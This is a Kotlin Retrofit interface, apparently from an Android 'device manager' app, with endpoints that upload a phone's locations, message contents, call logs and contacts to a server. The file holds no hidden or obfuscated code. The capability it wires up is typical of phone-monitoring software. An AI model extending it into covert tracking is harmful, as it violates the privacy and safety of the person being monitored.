package com.personal.devicemanager.network

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST
import retrofit2.http.Path

interface ApiService {
    @POST("api/auth/login")
    suspend fun login(@Body request: LoginRequest): Response<LoginResponse>

    @POST("api/auth/register")
    suspend fun register(@Body request: LoginRequest): Response<ApiResponse>

    @POST("api/devices/register")
    suspend fun registerDevice(@Body request: RegisterDeviceRequest): Response<ApiResponse>

    @POST("api/devices/{id}/status")
    suspend fun updateDeviceStatus(
        @Path("id") deviceId: String,
        @Body status: DeviceStatusPayload
    ): Response<ApiResponse>

    @POST("api/locations")
    suspend fun uploadLocations(@Body payload: IngestLocationsPayload): Response<ApiResponse>

    @POST("api/messages")
    suspend fun uploadMessages(@Body payload: IngestMessagesPayload): Response<ApiResponse>

    @POST("api/calls")
    suspend fun uploadCalls(@Body payload: IngestCallsPayload): Response<ApiResponse>

    @POST("api/contacts")
    suspend fun uploadContacts(@Body payload: IngestContactsPayload): Response<ApiResponse>
}

data class LoginRequest(
    val username: String,
    val password: String
)

data class LoginResponse(
    val success: Boolean,
    val token: String?,
    val error: String?
)

data class RegisterDeviceRequest(
    val id: String,
    val name: String,
    val model: String?,
    val android_version: String?,
    val app_version: String?
)

data class DeviceStatusPayload(
    val battery_level: Int,
    val is_charging: Boolean,
    val network_type: String
)

data class ApiResponse(
    val success: Boolean,
    val message: String?,
    val error: String?
)

data class LocationUploadItem(
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float?,
    val timestamp: String
)

data class IngestLocationsPayload(
    val device_id: String,
    val locations: List<LocationUploadItem>
)

data class MessageUploadItem(
    val sender: String,
    val content: String,
    val type: String,
    val timestamp: String
)

data class IngestMessagesPayload(
    val device_id: String,
    val messages: List<MessageUploadItem>
)

data class CallUploadItem(
    val number: String,
    val type: String,
    val duration: Int,
    val timestamp: String
)

data class IngestCallsPayload(
    val device_id: String,
    val calls: List<CallUploadItem>
)

data class ContactUploadItem(
    val name: String,
    val phone_number: String
)

data class IngestContactsPayload(
    val device_id: String,
    val contacts: List<ContactUploadItem>
)
